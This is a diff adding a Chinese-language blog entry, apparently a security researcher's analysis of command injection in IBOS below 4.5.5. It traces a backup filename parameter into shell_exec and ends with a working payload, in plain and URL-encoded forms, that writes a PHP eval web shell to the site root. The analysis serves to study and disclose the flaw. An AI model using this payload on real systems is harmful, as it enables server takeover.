@@ -16224,4 +16224,45 @@ Cookie: bbb
 <p><img src="/2022/09/13/seacms-wen-jian-shang-chuan-getshell-fen-xi/seacms-wen-jian-shang-chuan-getshell-fen-xi/image-20220913181052695.png" alt="image-20220913181052695"><img src="/2022/09/13/seacms-wen-jian-shang-chuan-getshell-fen-xi/seacms-wen-jian-shang-chuan-getshell-fen-xi/image-20220913181059165.png" alt="image-20220913181059165"></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>IBOS 4.5.4 命令执行分析</title>
+    <url>/2022/09/18/ibos-4.5.4-ming-ling-zhi-xing-fen-xi/ibos-4.5.4-ming-ling-zhi-xing-fen-xi/</url>
+    <content><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>ibos &lt; 4.5.5</code></pre>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在ibos4.5.5中 system\core\utils\database.php</p>
+<p>![image-20220918155811032](IBOS 4.5.4 命令执行分析.assets/image-20220918155811032.png)</p>
+<p>对比ibos4.5.4 system\core\utils\database.php</p>
+<p>![image-20220918155833651](IBOS 4.5.4 命令执行分析.assets/image-20220918155833651.png)</p>
+<p>可以看到shell_exec被删除</p>
+<p>全局搜索shell_exec</p>
+<p>data\restore.php中</p>
+<p>![image-20220918155650432](IBOS 4.5.4 命令执行分析.assets/image-20220918155650432.png)</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$mysqlBin</span> <span class="token punctuation">.</span> mysql <span class="token operator">-</span>h <span class="token punctuation">.</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span> <span class="token operator">-</span>P <span class="token number">3306</span> <span class="token operator">-</span>u root <span class="token operator">-</span>p root  ibos <span class="token operator">&lt;</span> <span class="token variable">$file</span><span class="token punctuation">;</span></code></pre>
+<ul>
+<li>$mysqlBin是上面代码1数据库查询结果</li>
+<li>$file来源未知</li>
+</ul>
+<p>system\core\utils\database.php中</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"{$mysqlBin}mysqldump --force --quick $command1 --add-drop-table $command2 $command3 --host=\"{$db["</span>host<span class="token string">"]}\" $command5 --user=\"{$db["</span>username<span class="token string">"]}\" --password=\"{$db["</span>password<span class="token string">"]}\" \"{$db["</span>dbname<span class="token string">"]}\" $tablesstr > $dumpFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>mysqldump是MYSQL用于备份数据库的命令，使用如下</p>
+<pre class=" language-sql"><code class="language-sql">mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> 数据库名 <span class="token punctuation">[</span>表名<span class="token punctuation">]</span> <span class="token operator">></span> 脚本名
+mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">--数据库名 [选项 表名] > 脚本名</span>
+mysqldump <span class="token punctuation">[</span>选项<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">--all-databases [选项]  > 脚本名</span></code></pre>
+<p>后台存在备份数据库的选项</p>
+<p>![image-20220918161732948](IBOS 4.5.4 命令执行分析.assets/image-20220918161732948.png)</p>
+<p>回到\system\core\utils\Database.php </p>
+<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span><span class="token variable">$dumpFile</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token constant">PATH_ROOT</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$backupFileName</span> <span class="token punctuation">.</span> <span class="token string">'.sql'</span><span class="token punctuation">;</span>
+<span class="token number">2</span><span class="token punctuation">.</span><span class="token variable">$backupFileName</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">BACKUP_DIR</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">3</span><span class="token punctuation">.</span><span class="token variable">$fileName</span> <span class="token operator">=</span> Env<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以看到，这两个就是$filename</p>
+<p>![img](IBOS 4.5.4 命令执行分析.assets/RGFX_I5_L_RYEM308`TWJ@I.png)</p>
+<p>但是，$backupFileName会把filename中的<code>/ \ .</code>替换为空</p>
+<p>利用windows的环境变量来绕过</p>
+<p>![image-20220918163758429](IBOS 4.5.4 命令执行分析.assets/image-20220918163758429.png)</p>
+<pre><code>1&amp;echo "&lt;?php @eval($_POST['a']);?&gt;" &gt; a%PATHEXT:~0,1%php&amp;1</code></pre>
+<p>还要对其进行编码，因为post数据会把&amp;当作多个参数</p>
+<pre><code>111%26echo%20%22%3C%3Fphp%20%40eval(%24_POST%5B'a'%5D)%3B%3F%3E%22%20%3E%20a%25PATHEXT%3A~0%2C1%25php%26111</code></pre>
+<p>![image-20220918165303689](IBOS 4.5.4 命令执行分析.assets/image-20220918165303689.png)</p>
+<p>发包就可在根目录写入a.php</p>
+]]></content>
+  </entry>
 </search>
